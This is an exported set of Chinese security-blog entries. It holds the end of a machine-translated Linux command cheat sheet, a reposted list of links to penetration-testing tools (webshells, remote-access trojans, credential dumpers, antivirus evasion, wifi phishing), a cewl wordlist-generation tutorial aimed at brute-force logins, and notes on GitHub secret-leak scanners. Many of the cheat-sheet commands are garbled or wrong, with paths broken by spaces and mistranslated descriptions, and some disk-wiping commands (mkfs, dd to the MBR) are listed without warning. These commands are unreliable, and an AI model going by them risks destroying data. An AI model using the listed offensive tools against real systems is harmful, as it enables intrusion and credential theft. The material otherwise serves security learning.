packages清理rpm缓存删除下载的包 yum clean headers删除所有头文件 yum clean all删除所有缓存的包和头文件 0x10 DEB包（Debian，Ubuntu以及类似系统）dpkg -i package.deb安装/更新一个deb包 dpkg -r package_name从系统删除一个deb包 dpkg -l显示系统中所有已经安装的deb包 dpkg -l | grep httpd显示所有名称中包含“httpd”字样的deb包 dpkg -s package_name获得已经安装在系统中一个特殊包的信息 dpkg -L package_name显示系统中已经安装的一个deb包所提供的文件列表 dpkg –contents package.deb显示尚未安装的一个包所提供的文件列表 dpkg -S / bin / ping确认所给的文件由哪个deb包提供 0x11 APT软件工具（Debian，Ubuntu以及类似系统）apt-get install package_name安装/更新一个deb包 apt-cdrom install package_name从光盘安装/更新一个deb包 apt-get update升级列表中的软件包 apt-get upgrade升级所有已安装的软件 apt-get remove package_name从系统删除一个deb包 apt-get check确认依赖的软件仓库正确 apt-get clean从下载的软件包中清理缓存 apt-cache search search-package返回包含所要搜索字符串的软件包名称 0x12 查看文件内容cat file1从第一个字节开始正向查看文件的内容 tac file1从最后一行开始反向查看一个文件的内容 更多file1查看一个长文件的内容 less file1类似于’more’命令，但是它允许在文件中和正向操作一样的反向操作 head -2 file1查看一个文件的前两行 tail -2 file1查看一个文件的最后两行 tail -f / var / log / messages实时查看被添加到一个文件中的内容 0x13 文本处理cat file1 file2 … | command &lt;&gt; file1_in.txt_or_file1_out.txt使用PIPE，STDIN和STDOUT进行文本操作的一般语法 cat file1 | 命令（sed，grep，awk，grep等等）&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个新文件中 cat file1 | 命令（sed，grep，awk，grep等等）&gt;&gt; result.txt合并一个文件的详细说明文本，并将简介写入一个已有的文件中 grep Aug / var / log / messages在文件’/ var / log / messages’中查找关键词“Aug” grep ^ Aug / var / log / messages在文件’/ var / log / messages’中查找以“Aug”开始的词汇 grep [0-9] / var / log / messages选择’/ var / log / messages’文件中所有包含数字的行 grep Aug -R / var / log / *在目录’/ var / log’及随后的目录中搜索字符串“Aug” sed’s / stringa1 / stringa2 / g’example.txt将example.txt文件中的“string1”替换成“string2” sed’/ ^ $ / d’example.txt从example.txt文件中删除所有空白行 sed’/ *＃/ d; / ^ $ / d’example.txt从example.txt文件中删除所有注释和空白行 echo’esempio’| tr’[：lower：]’’[：upper：]’合并上下单元格内容 sed -e’1d’rend.txt从文件example.txt中排除第一行 sed -n’/ stringa1 / p’查看只包含词汇“string1”的行 sed -e’s / * $ //‘example.txt删除每一行最后的空白字符 sed -e’s / stringa1 // g’example.txt从文档中只删除词汇“string1”并保留剩余全部 sed -n’1,5p; 5q’example.txt查看从第一行到第5行内容 sed -n’5p; 5q’example.txt查看第5行 sed -e’s / 00 * / 0 / g’example.txt用单个零替换多个零 cat -n file1标示文件的行数 cat example.txt | awk’NR％2 == 1’删除example.txt文件中的所有偶数行 echo abc | awk’{print $ 1}’查看一行第一栏 echo abc | awk’{print $ 1，$ 3}’查看一行的第一和第三栏 paste file1 file2合并两个文件或两栏的内容 paste -d’+’file1 file2合并两个文件或两栏的内容，中间用“+”区分 sort file1 file2排序两个文件的内容 sort file1 file2 | uniq取出两个文件的并集（重复的行只保留一份） sort file1 file2 | uniq -u删除交集，留下其他的行 sort file1 file2 | uniq -d取出两个文件的交集（只留下同时存在于两个文件中的文件） comm -1 file1 file2比较两个文件的内容只删除’file1’所包含的内容 comm -2 file1 file2比较两个文件的内容只删除’file2’所包含的内容 comm -3 file1 file2比较两个文件的内容只删除两个文件共有的部分 0x14 字符设置和文件格式转换dos2unix filedos.txt fileunix.txt将一个文本文件的格式从MSDOS转换成UNIX unix2dos fileunix.txt filedos.txt将一个文本文件的格式从UNIX转换成MSDOS recode ..HTML &lt;page.txt&gt; page.html将一个文本文件转换成html recode -l | 更多显示所有允许的转换格式 0x15 文件系统分析badblocks -v / dev / hda1检查磁盘hda1上的坏磁块 fsck / dev / hda1修复/检查hda1磁盘上linux文件系统的完整性 fsck.ext2 / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck / dev / hda1修复/检查hda1磁盘上ext2文件系统的完整性 e2fsck -j / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性 fsck.ext3 / dev / hda1修复/检查hda1磁盘上ext3文件系统的完整性 fsck.vfat / dev / hda1修复/检查hda1磁盘上fat文件系统的完整性 fsck.msdos / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性 dosfsck / dev / hda1修复/检查hda1磁盘上dos文件系统的完整性 0x16 初始化一个文件系统mkfs / dev / hda1在hda1分区创建一个文件系统 mke2fs / dev / hda1在hda1分区创建一个linux ext2的文件系统 mke2fs -j / dev / hda1在hda1分区创建一个linux ext3（日志型）的文件系统 mkfs -t vfat 32 -F / dev / hda1创建一个FAT32文件系统 fdformat -n / dev / fd0格式化一个软盘 mkswap / dev / hda3创建一个swap文件系统 返回顶部索引^ SWAP文件系统 mkswap / dev / hda3创建一个swap文件系统 swapon / dev / hda3启用一个新的swap文件系统 swapon / dev / hda2 / dev / hdb3启用两个交换分区 0x17 备份dump -0aj -f /tmp/home0.bak / home制作一个’/ home’目录的完整备份 dump -1aj -f /tmp/home0.bak / home制作一个’/ home’目录的交互式备份 恢复-if /tmp/home0.bak还原一个交互式备份 rsync -rogpav –delete / home / tmp同步两边的目录 rsync -rogpav -e ssh –delete / home ip_address：/ tmp通过SSH通道rsync rsync -az -e ssh –delete ip_addr：/ home / public / home / local通过ssh和压缩将一个远程目录同步到本地目录 rsync -az -e ssh –delete / home / local ip_addr：/ home / public通过ssh和压缩将本地目录同步到远程目录 dd bs = 1M if = / dev / hda | gzip | ssh user @ ip_addr’dd of = hda.gz’通过ssh在远程主机上执行一次备份本地磁盘的操作 dd if = / dev / sda = / tmp / file1备份磁盘内容到一个文件 tar -Puf backup.tar / home / user执行一次对’/ home / user’目录的交互式备份操作 （cd / tmp / local / &amp;&amp; tar c。）| ssh -C user @ ip_addr’cd / home / share / &amp;&amp; tar x -p’通过ssh在远程目录中复制一个目录内容 （tar c / home）| ssh -C user @ ip_addr’cd / home / backup-home &amp;&amp; tar x -p’通过ssh在远程目录中复制一个本地目录 tar cf - 。| （cd / tmp / backup; tar xf - ）本地将一个目录复制到另一个地方，保留原有权限及链接 find / home / user1 -name’* .txt’| xargs cp -av –target-directory = / home / backup / –parents从一个目录查找并复制所有以’.txt’结尾的文件到另一个目录 find / var / log -name’* .log’| tar cv –files-from = - | bzip2&gt; log.tar.bz2查找所有以’.log’结尾的文件并做成一个bzip包 dd if = / dev / hda of = / dev / fd0 bs = 512 count = 1做一个将MBR（Master Boot Record）内容复制到软盘的动作 dd if = / dev / fd0 of = / dev / hda bs = 512 count = 1从已经保存到软盘的备份中恢复MBR内容 0x18 光盘cdrecord -v gracetime = 2 dev = / dev / cdrom -eject blank = fast -force清空一个可复写的光盘内容 mkisofs / dev / cdrom&gt; cd.iso在磁盘上创建一个光盘的iso镜像文件 mkisofs / dev / cdrom | gzip&gt; cd_iso.gz在磁盘上创建一个压缩了的光盘iso镜像文件 mkisofs -J -allow-leading-dots -R -V“Label CD”-iso-level 4 -o ./cd.iso data_cd创建一个目录的iso镜像文件 cdrecord -v dev = / dev / cdrom cd.iso刻录一个ISO镜像文件 gzip -dc cd_iso.gz | cdrecord dev = / dev / cdrom - 刻录一个压缩了的ISO镜像文件 mount -o loop cd.iso / mnt / iso挂载一个ISO镜像文件 cd-paranoia -B从一个CD光盘转录音轨到wav文件中 cd-paranoia - “-3”从一个CD光盘转录音轨到wav文件中（参数-3） cdrecord –scanbus扫描总线以识别scsi通道 dd if = / dev / hdc | md5sum校验一个设备的md5sum编码，例如一张CD 0x19 网络 - （以太网和WIFI无线）ifconfig eth0显示一个以太网卡的配置 ifup eth0启用一个’eth0’网络设备 ifdown eth0禁用一个’eth0’网络设备 ifconfig eth0 192.168.1.1 netmask 255.255.255.0控制IP地址 ifconfig eth0 promisc设置’eth0’成混杂模式以嗅探数据包（sniffing） dhclient eth0以dhcp模式启用’eth0’ route -n show routing table route add -net 0/0 gw IP_Gateway configura默认网关 route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1配置静态路由到达网络’192.168.0.0/16’ route del 0/0 gw IP_gateway删除静态路由 echo“1”&gt; / proc / sys / net / ipv4 / ip_forward激活ip routing hostname显示系统的主机名 主机www.example.com查找主机名将名称解析为IP地址，反之亦然（1） nslookup www.example.com查找主机名将名称解析为ip地址，反之亦然（2） ip link show显示所有接口的链接状态 mii-tool eth0显示’eth0’的链接状态 ethtool eth0显示网卡’eth0’的统计信息 netstat -tup显示所有活动网络连接及其PID netstat -tupl显示监听系统及其PID的所有网络服务 tcpdump tcp端口80显示所有HTTP流量 iwlist扫描显示无线网络 iwconfig eth1显示无线网卡的配置 主机名显示主机名 托管www.example.com查找主机名，将名称解析为ip地址，反之亦然 nslookup www.example.com查找主机名将名称解析为ip地址，反之亦然 whois www.example.com查找Whois数据库 GO TOP INDEX ^ Microsoft Windows网络（SAMBA） nbtscan ip_addr netbios名称解析 nmblookup -A ip_addr netbios名称解析 smbclient -L ip_addr / hostname显示Windows主机的远程共享 smbget -Rr smb：// ip_addr / share像wget可以通过smb从主机窗口下载文件 mount -t smbfs -o username = user，password = pass // WinClient / share / mnt / share挂载一个windows网络共享]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>命令</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试工具库]]></title>
    <url>%2F2019%2F08%2F26%2FPython%E5%B7%A5%E5%85%B7%E5%BA%93%2F</url>
    <content type="text"><![CDATA[0x00 前言我们咋进行渗透测试的过程中，可能会用到很多的开源测试工具，但是一个个去寻找太过于繁琐了，索性tools论文中给我们整理好了，这里转载一下，也方便自己查看。 转载链接：https://www.t00ls.net/pytools.html 0x01 漏洞及渗透练习平台WebGoat漏洞练习平台： https://github.com/WebGoat/WebGoat webgoat-legacy漏洞练习平台: https://github.com/WebGoat/WebGoat-Legacy zvuldirll漏洞练习平台： https://github.com/710leo/ZVulDrill vulapps漏洞练习平台： https://github.com/Medicean/VulApps dvwa漏洞练习平台： https://github.com/RandomStorm/DVWA 数据库注入练习平台 ： https://github.com/Audi-1/sqli-labs 用node编写的漏洞练习平台，like OWASP Node Goat： https://github.com/cr0hn/vulnerable-node Ruby编写的一款工具，生成含漏洞的虚拟机： https://github.com/cliffe/secgen 0x02 花式扫描器Nmap端口扫描器： https://github.com/nmap/nmap 本地网络扫描器： https://github.com/SkyLined/LocalNetworkScanner 子域名扫描器： https://github.com/lijiejie/subDomainsBrute https://github.com/aboul3la/Sublist3r https://github.com/TheRook/subbrute https://github.com/infosec-au/altdns linux漏洞扫描： https://github.com/future-architect/vuls 基于端口扫描以及关联CVE: https://github.com/m0nad/HellRaiser 漏洞路由扫描器： https://github.com/jh00nbr/Routerhunter-2.0 迷你批量信息泄漏扫描脚本： https://github.com/lijiejie/BBScan Waf类型检测工具： https://github.com/EnableSecurity/wafw00f 服务器端口弱口令扫描器： https://github.com/wilson9x1/fenghuangscanner_v3 Fox-scan扫描器： https://github.com/fengxuangit/Fox-scan/ 0x03 信息搜集工具社工收集器： https://github.com/n0tr00t/Sreg Github信息搜集： https://github.com/sea-god/gitscan github Repo信息搜集工具： https://github.com/metac0rtex/GitHarvester 信息探测及扫描工具： https://github.com/darryllane/Bluto 内部网络信息扫描器： https://github.com/sowish/LNScan 远程桌面登录扫描器： https://github.com/linuz/Sticky-Keys-Slayer 网络基础设施渗透工具 https://github.com/SECFORCE/sparta SNMAP密码破解: https://github.com/SECFORCE/SNMP-Brute 0x04 WEBwebshell大合集： https://github.com/tennc/webshell 渗透以及web攻击脚本： https://github.com/brianwrf/hackUtils web渗透小工具大合集： https://github.com/rootphantomer/hacktoolsfor_me XSS数据接收平台： https://github.com/firesunCN/BlueLotus_XSSReceiver XSS与CSRF工具： https://github.com/evilcos/xssor xss多功能扫描器： https://github.com/shawarkhanethicalhacker/BruteXSS web漏洞扫描器: https://github.com/andresriancho/w3af WEB漏洞扫描器： https://github.com/sullo/nikto 渗透常用小工具包： https://github.com/leonteale/pentestpackage web目录扫描器: https://github.com/maurosoria/dirsearch web向命令注入检测工具： https://github.com/stasinopoulos/commix 自动化SQL注入检查工具： https://github.com/epinna/tplmap SSL扫描器： https://github.com/rbsec/sslscan 安全工具集合： https://github.com/codejanus/ToolSuite apache日志分析器： https://github.com/mthbernardes/ARTLAS php代码审计工具： https://github.com/pwnsdx/BadCode web指纹识别扫描： https://github.com/urbanadventurer/whatweb 检查网站恶意攻击： https://github.com/ciscocsirt/malspider wordprees漏洞扫描器： https://github.com/wpscanteam/wpscan 固件漏洞扫描器： https://github.com/misterch0c/firminator_backend 数据库注入工具 https://github.com/sqlmapproject/sqlmap Web代理： https://github.com/zt2/sqli-hunter 新版中国菜刀： https://github.com/Chora10/Cknife git泄露利用EXP： https://github.com/lijiejie/GitHack 浏览器攻击框架： https://github.com/beefproject/beef 自动化绕过WAF脚本： https://github.com/khalilbijjou/WAFNinja https://github.com/owtf/wafbypasser 一款开源WAF： https://github.com/SpiderLabs/ModSecurity http命令行客户端： https://github.com/jkbrzt/httpie 浏览器调试利器： https://github.com/firebug/firebug DISCUZ漏洞扫描器： https://github.com/code-scan/dzscan 自动化代码审计工具 https://github.com/wufeifei/cobra 浏览器攻击框架： https://github.com/julienbedard/browsersploit tomcat自动后门部署： https://github.com/mgeeky/tomcatWarDeployer 网络空间指纹扫描器： https://github.com/nanshihui/Scan-T burpsuit之J2EE扫描插件： https://github.com/ilmila/J2EEScan 0x05 windows域渗透工具mimikatz明文注入： https://github.com/gentilkiwi/mimikatz Powershell渗透库合集： https://github.com/PowerShellMafia/PowerSploit Powershell tools合集： https://github.com/clymb3r/PowerShell powershell的mimikittenz: https://github.com/putterpanda/mimikittenz 域渗透教程: https://github.com/l3m0n/pentest_study 0x06 FuzzWeb向Fuzz工具 https://github.com/xmendez/wfuzz HTTP暴力破解，撞库攻击脚本 https://github.com/lijiejie/htpwdScan 0x07 漏洞利用及攻击框架msf框架： https://github.com/rapid7/metasploit-framework pocsscan攻击框架： https://github.com/erevus-cn/pocscan Pocsuite攻击框架: https://github.com/knownsec/Pocsuite Beebeeto攻击框架： https://github.com/n0tr00t/Beebeeto-framework 0x08 漏洞POC&amp;EXPExploitDB官方git版本: https://github.com/offensive-security/exploit-database php漏洞代码分析： https://github.com/80vul/phpcodz CVE-2016-2107: https://github.com/FiloSottile/CVE-2016-2107 CVE-2015-7547 POC： https://github.com/fjserna/CVE-2015-7547 JAVA反序列化POC生成工具: https://github.com/frohoff/ysoserial JAVA反序列化EXP: https://github.com/foxglovesec/JavaUnserializeExploits Jenkins CommonCollections EXP: https://github.com/CaledoniaProject/jenkins-cli-exploit CVE-2015-2426 EXP (windows内核提权): https://github.com/vlad902/hacking-team-windows-kernel-lpe use docker to show web attack(php本地文件包含结合phpinfo getshell 以及ssrf结合curl的利用演示): https://github.com/hxer/vulnapp php7缓存覆写漏洞Demo及相关工具: https://github.com/GoSecure/php7-opcache-override XcodeGhost木马样本: https://github.com/XcodeGhostSource/XcodeGhost 0x09 中间人攻击及钓鱼中间人攻击框架: https://github.com/secretsquirrel/the-backdoor-factory https://github.com/secretsquirrel/BDFProxy https://github.com/byt3bl33d3r/MITMf Inject code, jam wifi, and spy on wifi users: https://github.com/DanMcInerney/LANs.py 中间人代理工具: https://github.com/intrepidusgroup/mallory wifi钓鱼: https://github.com/sophron/wifiphisher 0x10 密码破解密码破解工具: https://github.com/shinnok/johnny 本地存储的各类密码提取利器: https://github.com/AlessandroZ/LaZagne 0x11 二进制及代码分析工具二进制分析工具 https://github.com/devttys0/binwalk 系统扫描器 https://github.com/quarkslab/binmap rp: https://github.com/0vercl0k/rp Windows Exploit Development工具 https://github.com/lillypad/badger 0x12 二进制静态分析工具（python）https://github.com/bdcht/amoco Python Exploit Development Assistance for GDB: https://github.com/longld/peda 对BillGates Linux Botnet系木马活动的监控工具 https://github.com/ValdikSS/billgates-botnet-tracker 木马配置参数提取工具: https://github.com/kevthehermit/RATDecoders Shellphish编写的二进制分析工具（CTF向）: https://github.com/angr/angr 针对python的静态代码分析工具: https://github.com/yinwang0/pysonar2 一个自动化的脚本（shell）分析工具，用来给出警告和建议: https://github.com/koalaman/shellcheck 基于AST变换的简易Javascript反混淆辅助工具: https://github.com/ChiChou/etacsufbo 0x13 EXP编写框架及工具二进制EXP编写工具: https://github.com/t00sh/rop-tool CTF Pwn 类题目脚本编写框架: https://github.com/Gallopsled/pwntools an easy-to-use io library for pwning development: https://github.com/zTrix/zio 跨平台注入工具: https://github.com/frida/frida 哈希长度扩展攻击EXP： https://github.com/citronneur/rdpy 0x14 隐写隐写检测工具 https://github.com/abeluck/stegdetect 0x15 各类安全资料data_hacking合集: https://github.com/ClickSecurity/data_hacking mobile-security-wiki: https://github.com/exploitprotocol/mobile-security-wiki 书籍《reverse-engineering-for-beginners》: https://github.com/veficos/reverse-engineering-for-beginners 一些信息安全标准及设备配置: https://github.com/luyg24/IT_security APT相关笔记: https://github.com/kbandla/APTnotes Kcon资料: https://github.com/knownsec/KCon 《DO NOT FUCK WITH A HACKER》: https://github.com/citypw/DNFWAH 各类安全脑洞图： https://github.com/phith0n/Mind-Map 信息安全流程图： https://github.com/SecWiki/sec-chart/ tree/294d7c1ff1eba297fa892dda08f3c05e90ed1428 0x16 各类CTF资源近年ctf writeup大全: https://github.com/ctfs/write-ups-2016 https://github.com/ctfs/write-ups-2015 https://github.com/ctfs/write-ups-2014 fbctf竞赛平台Demo: https://github.com/facebook/fbctf ctf Resources: https://github.com/ctfs/resources ctf及黑客资源合集: https://github.com/bt3gl/My-Gray-Hacker-Resources ctf和安全工具大合集: https://github.com/zardus/ctf-tools ctf向 python工具包 https://github.com/P1kachu/v0lt 0x17 各类编程资源大礼包（什么都有）: https://github.com/bayandin/awesome-awesomeness bash-handbook: https://github.com/denysdovhan/bash-handbook python资源大全: https://github.com/jobbole/awesome-python-cn git学习资料: https://github.com/xirong/my-git 安卓开源代码解析 https://github.com/android-cn/android-open-project python框架，库，资源大合集: https://github.com/vinta/awesome-python JS 正则表达式库（用于简化构造复杂的JS正则表达式）: https://github.com/VerbalExpressions/JSVerbalExpressions 0x18 Pythonpython 正则表达式库（用于简化构造复杂的python正则表达式）: https://github.com/VerbalExpressions/ python任务管理以及命令执行库: https://github.com/pyinvoke/invoke python exe打包库: https://github.com/pyinstaller/pyinstaller Veil-Evasion免杀项目： https://github.com/Veil-Framework/Veil-Evasion py3 爬虫框架: https://github.com/orf/cyborg 一个提供底层接口数据包编程和网络协议支持的python库: https://github.com/CoreSecurity/impacket python requests 库: https://github.com/kennethreitz/requests python 实用工具合集: https://github.com/mahmoud/boltons python爬虫系统: https://github.com/binux/pyspider 0x19 科学上网科学上网工具 https://github.com/XX-net/XX-Net 0x20 福利微信自动抢红包动态库 https://github.com/east520/AutoGetRedEnv 微信抢红包插件（安卓版） https://github.com/geeeeeeeeek/WeChatLuckyMoney hardsed神器: https://github.com/yangyangwithgnu/hardseed 0x21 甲方安全工程师生存指南web索引及日志搜索工具： https://github.com/thomaspatzke/WASE 开源日志采集器： https://github.com/wgliang/logcool 扫描CS结构的web debuger https://github.com/Kozea/wdb 恢复sqlite数据库删除注册信息： https://github.com/aramosf/recoversqlite/ gps欺骗检测工具: https://github.com/zxsecurity/gpsnitch 应急处置响应框架: https://github.com/biggiesmallsAG/nightHawkResponse web安全开发指南: https://github.com/FallibleInc/security-guide-for-developers 各个知名厂商漏洞测试报告模板： https://github.com/juliocesarfort/public-pentesting-reports linux下恶意代码检测包： https://github.com/rfxn/linux-malware-detect 操作系统运行指标可视化框架： https://github.com/facebook/osquery 恶意代码分析系统： https://github.com/cuckoosandbox/cuckoo 定期搜索及存储web应用： https://github.com/Netflix/Scumblr 事件响应框架： https://github.com/google/grr 综合主机监控检测平台： https://github.com/ossec/ossec-hids 分布式实时数字取证系统： https://github.com/mozilla/mig Microsoft &amp; Unix 文件系统及硬盘取证工具： https://github.com/sleuthkit/sleuthkit 0x22 蜜罐SSH蜜罐： https://github.com/desaster/kippo 蜜罐集合资源： https://github.com/paralax/awesome-honeypots kippo进阶版蜜罐： https://github.com/micheloosterhof/cowrie SMTP 蜜罐： https://github.com/awhitehatter/mailoney web应用程序蜜罐： https://github.com/mushorg/glastopf 数据库蜜罐： https://github.com/jordan-wright/elastichoney web蜜罐： https://github.com/atiger77/Dionaea 0x23 远控用gmail充当C&amp;C服务器的后门 https://github.com/byt3bl33d3r/gcat 开源的远控： https://github.com/UbbeLoL/uRAT c#远控： https://github.com/hussein-aitlahcen/BlackHole]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>转载</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[密码生成工具cewl的使用]]></title>
    <url>%2F2019%2F08%2F22%2F%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7-cewl%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x00 前言今天给大家介绍的是Linux字典生成工具cewl，并学习更多的高级参数用法。首先先简单的介绍一个cewl工具，该工具最大的功能就能能够爬取网站上的信息并自动生成字典，然后就可以使用该字典配合hydra去进行暴力破解，该工具常用于CTF中攻靶拿Flag使用。OK下面开始进入正题。 0x01 环境需求 cewl需要安装在Linux中使用，我使用的环境事kali Linux 如果使用的是其他Linux版本的系统话，需要使用命令去安装 1sodo apt-get install cewl 命令行运行截图 0x02 参数说明2.1 可选参数1234567891011121314151617-h, –help：显示帮助。-k, –keep：保存下载文件。-d &lt;x&gt;, –depth &lt;x&gt;：爬行深度，默认2。-m, –min_world_length：最小长度，默认最小长度为3。-o, –offsite：允许爬虫访问其他站点。-w, –write：将输出结果写入到文件。-u, –ua &lt;agent&gt;：设置user agent。-n, –no-words：不输出字典。–with-numbers：允许单词中存在数字，跟字母一样。-a, –meta：包括元数据。–meta_file file：输出元数据文件。-e, –email：包括email地址。–email_file &lt;file&gt;：输入邮件地址文件。–meta-temp-dir &lt;dir&gt;：exiftool解析文件时使用的临时目录，默认是/temp。-c, –count：显示发现的每个单词的数量。-v, –verbose：verbose。–debug:提取调试信息。 2.2 认证123–auth_type：Digest或者basic认证。–auth_user：用户名认证。–auth_pass：密码认证。 2.3 代理1234–proxy_host：代理主机。–proxy_port：代理端口，默认8080。–proxy_username：用户名代理。–proxy_password：密码代理。 0x03 实例使用语法：cewl &lt;url&gt; [options] 3.1 简单用法1cewl https://xxxx.com 用法说明：cewl会爬行该网页，抓取网页中的英文字母，没有设置最小字母长度的情况下默认是3,可以使用-m来指定最小单词长度。 ##3.2 保存输出结果 将指定长度的结果报错在txt文件中 12cewl https://digi.ninja/ -m 5 -w test.txt ##爬行该页面上最小长度为5的单词并将结果保存在test.txt文档中 然后输入ls -lh来查看结果文件 使用cat test.txt命令来查看 ps:如果该站点的英文单词特别多的话，需要相当一段时间。 然后输入ls -lh来查看结果文件 ##3.3 从网站获取email地址 你可以使用-e参数来启用邮件参数，配合-n参数使用，-n参数是在爬行给定网站时隐藏生成的单词列表： 由于刚刚的测试站点上没有email地址，为了能更好的展示出来，换了一个有email地址的网页。结果如下： 1cewl 目标站点 -e -n 3.4 统计网站中单词的重复次数一个英文网站中，不免有很多重复的单词，如果你想统计每个单词的重复次数，可以使用-c命令 3.5 增加爬行深度如果你想增加爬行等级，来遍历网站中更多的单词来生成更大的字典，你可以使用-d参数，并指定一个爬行深度 等级来进行更加深入的爬行，默认等级是2 1cewl https://portswigger.net/blog/http-desync-attacks-request-smuggling-reborn -d 3 3.6 提取调试信息你可以使用--debug参数来启用调试模式，显示爬行网站时的错误和原始详细信息： 3.7 Verbose模式为了扩大网站的爬行结果来获取网站更加完整详细的信息，你可以加-v参数，也就是verbose模式。它不会生成字典，而是会dump网站上的信息。 3.8 生成数字字典如果你想生成字母数字字典，你可以使用—with-numbers参数 1cewl http://testphp.vulnweb.com/ --with-numbers 3.9 cewl摘要/基础认证如果存在一个认证页面来登录网站，那么上面的配置就行不通了，为了生成字典，我们需要使用下面的参数来绕过认证页面： 123–auth_type: Digest/basic –auth_user:用户名 –auth_pass: 密码 1cewl http://192.168.1.105/dvwa/login.php --auth_type Digest --auth_user --用户名 auth_pass 密码 -v 或者 1cewl http://192.168.1.105/dvwa/login.php --auth_type basic --auth_user admin --auth_pass password -v 3.9 代理URL如果网站使用了代理服务器，那么cewl的默认命令就无法生成字典了，比如下面这条命令： 1cewl -w dict.txt http://192.168.1.103/wordpress/ 不过你可以使用—proxy参数来开启代理URL，这样就可以生成字典了，比如下列命令： 1cewl --proxy_host 192.168.1.103 --proxy_port 3128 -w dict.txt http://192.168.1.103/wordpress/ 如下图所示，执行第二条命令之后，成功的输出了单词列表： 0x04 参考链接https://www.4hou.com/tools/14693.html ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[工作之杂谈]]></title>
    <url>%2F2019%2F08%2F22%2F%E5%B7%A5%E4%BD%9C%E4%B9%8B%E6%9D%82%E8%B0%88%2F</url>
    <content type="text"><![CDATA[0x00 前言简单谈谈在第一家公司工作近半年的感受。emmm，我的语文打小就不好，所以不会写软文，只会写大白话。做做记录而已啦~ 0x01 正文转眼间，我在第一家公司工作有近半年的时间了，在这半年的时间里，怎么说尼，我收获到了知识、工作技能、朋友，虽然我工作的这家公司不是什么500强公司，但是公司的工作氛围还可以，并且自己在做完工作后可以看书提升自己的技能。下面来简单介绍一下这几个月的工作和生活情况。 1.1 第一个月 刚到公司的第一天，我来的还挺早，看到很多陌生的同事，我也不知道咋办，我，情商比较低，so，尴尬的喊哥，喊姐的打招呼。然后把公司的同事QQ都加了一遍（是不是有点小学生的感觉 0.0）。 ###]]></content>
      <categories>
        <category>记录生活</category>
      </categories>
      <tags>
        <tag>工作</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[4款GitHub泄露敏感信息搜索工具的安装使用与比较]]></title>
    <url>%2F2019%2F08%2F22%2F4%E6%AC%BEGitHub%E6%B3%84%E9%9C%B2%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%90%9C%E7%B4%A2%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E4%B8%8E%E6%AF%94%E8%BE%83%2F</url>
    <content type="text"><![CDATA[0x00 前言GitHub是一个免费开源的网站，是每个程序员最喜欢发布代码，分享技术的地方，这就导致了一个问题，程序员上传的代码中可能包含了项目中的敏感信息，比如数据库的链接地址和账号密码等。今天来给大家介绍4款发现GitHub中泄露的敏感信息的工具，并将它们做个对比。 0x01 gitrob1.1 简介Gitrob是一个帮助查找推送到Github上的公共存储库的潜在敏感文件的工具。Gitrob将属于用户或组织的存储库克隆到可配置的深度，并遍历提交历史记录并标记与潜在敏感文件的签名匹配的文件。调查结果将通过网络界面呈现，以便于浏览和分析。Ruby开发，支持通过postgresql数据库 github地址：传送门 下载地址：传送门 1.2 生成GitHub token 记住这个令牌，它只出现一次。 1.3 使用1.3.1 快速使用语法： gitrob [options] target [target2] … [targetN] 参数： 12345678910111213141516171819202122-bind-address string Address to bind web server to (default "127.0.0.1")-commit-depth int Number of repository commits to process (default 500)-debug Print debugging information-github-access-token string GitHub access token to use for API requests-load string Load session file-no-expand-orgs Don't add members to targets when processing #组织-port int Port to run web server on (default 9393)-save string Save session to file-silent Suppress all output except for errors-threads int Number of concurrent threads (default number of logical CPUs) 1.3.2 将会话保存到文件默认情况下，gitrob会将其状态存储在内存中进行评估。这意味着当Gitrob关闭时，评估结果将丢失。您可以使用以下-save选项将会话保存到文件： 1gitrob -save ~/gitrob-session.json acmecorp Gitrob会将所有收集的信息保存为指定的文件路径，作为特殊的JSON文档。可以再次加载该文件以便在其他时间点进行浏览，与其他分析人员共享或解析以与其他工具和系统进行自定义集成。 1.3.3 从文件加载会话存储在文件中的会话可以使用以下-load选项加载： 1gitrob -load ~/gitrob-session.json Gitrob将启动其Web界面并提供结果进行分析。 1.3.4 案例分享Windows下使用： 1gitrob.exe -bind-address 127.0.0.1 -github-access-token GitHubtoken值 个人的库 Linux下使用： 1./gitrob -bind-address 127.0.0.1 -github-access-token GitHubtoken值 xsafe 在浏览器中输入http://127.0.0.1:9393查看分析结果 1.4 总结开始捣鼓这个的时候，看了官方文档愣是半天没有看懂，因为还需要编译，然后在网上搜集了一些文章看到有直接下载编译好的，有Linux，MAC OS ，Windows 3个版本的。最DT的是，下载下来还不知道用，然后自己摸索，得出了这篇教程。 PS:github token 后面的是GitHub的个人账户或者组织账户，该软件只是对某个账户下的文件进行分析，而不是对GitHub所有的文件查找敏感信息，一开始我以后是搜索关键字就可以从整个GitHub中搜索敏感信息的。结果~ 0x02 weakfilescanweakfilescanPython开发，多线程，猪猪侠开发中文注释，个性化定制，需要beautifulsoup4用于渗透人员在对网站进行网站渗透时查找敏感文件（配置文件、临时文件）、敏感目录，会首先爬取目标站点的三层目录资源，生成目录FUZZ和文件FUZZhttps://github.com/ring04h/weakfilescan 0x03 GitPreyGitPreyPython开发，国人开发中文支持，用于企业搜索关键词，及时发现潜在的敏感信息，需要登录https://github.com/repoog/GitPrey 0x04 GitMinerGitMinerPython开发，功能简单https://github.com/UnkL4b/GitMiner 0x05 Hawkeyehttps://github.com/0xbug/Hawkeye 0x05 参考链接https://www.cnblogs.com/sch01ar/p/7625607.html https://www.helplib.com/GitHub/article_119072 ###]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>信息泄露</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PicGo+GitHub打造自己的图床]]></title>
